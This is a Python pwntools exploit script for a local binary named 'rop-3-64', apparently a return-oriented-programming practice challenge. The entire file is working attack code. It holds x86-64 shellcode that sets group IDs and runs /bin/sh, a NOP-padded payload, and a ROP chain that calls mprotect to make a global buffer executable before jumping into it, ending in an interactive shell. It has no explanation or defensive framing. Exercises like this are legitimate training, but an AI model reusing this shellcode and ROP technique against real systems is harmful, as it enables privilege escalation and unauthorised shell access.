#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-3-64')

shellcode = 'jlX\x0f\x05H\x89\xc6H\x89\xc7jrX\x0f\x05H1\xf6H1\xd2j;XH\xbb//bin/shVSH\x89\xe7\x0f\x05'
#32 bit: 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc91\xd2j\x0bXShn/shh//bi\x89\xe3\xcd\x80'

while (len(shellcode)) < 0x88:
        shellcode += "\x90"

buf = shellcode

"""
0x0000000000400520  mprotect@plt
"""

mprotect = p64(0x400520)

"""
0x0000000000400743 : pop rdi ; ret
0x000000000040064a : pop rdx ; nop ; pop rbp ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
"""

pop_rdi = p64(0x400743)
pop_rsi_pop_ret = p64(0x400741)
pop_rdx_pop_ret = p64(0x40064a)

g_buf_addr = p64(0x601080)
g_buf_aligned = p64(0x601000)

buf += pop_rdi
buf += g_buf_aligned
buf += pop_rsi_pop_ret
buf += p64(0x1000)
buf += p64(0x1000)
buf += pop_rdx_pop_ret
buf += p64(7)
buf += p64(7)
buf += mprotect
buf += g_buf_addr

with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
